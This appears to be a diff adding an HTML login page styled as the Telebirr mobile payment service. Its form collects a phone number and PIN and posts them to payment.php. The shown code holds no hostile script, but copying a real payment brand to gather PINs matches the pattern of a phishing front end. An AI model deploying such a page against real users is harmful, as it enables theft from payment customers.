@@ -1,0 +1,33 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telebirr Login</title>
+    <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <img src="images/logo.png" alt="Telebirr Logo" class="logo" />
+            <h1>Telebirr</h1>
+            <p class="subtitle">Secure &amp; Fast Mobile Payment</p>
+
+            <form id="loginForm" action="payment.php" method="POST">
+                <div class="input-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" placeholder="09xxxxxxxx" required />
+                </div>
+                <div class="input-group">
+                    <label for="pin">PIN</label>
+                    <input type="password" id="pin" name="pin" placeholder="****" maxlength="6" required />
+                </div>
+                <button type="submit" class="btn-primary">Login</button>
+            </form>
+            <p class="footer-text">© 2026 Telebirr. All rights reserved.</p>
+        </div>
+    </div>
+    <script src="js/script.js"></script>
+</body>
+  </html>
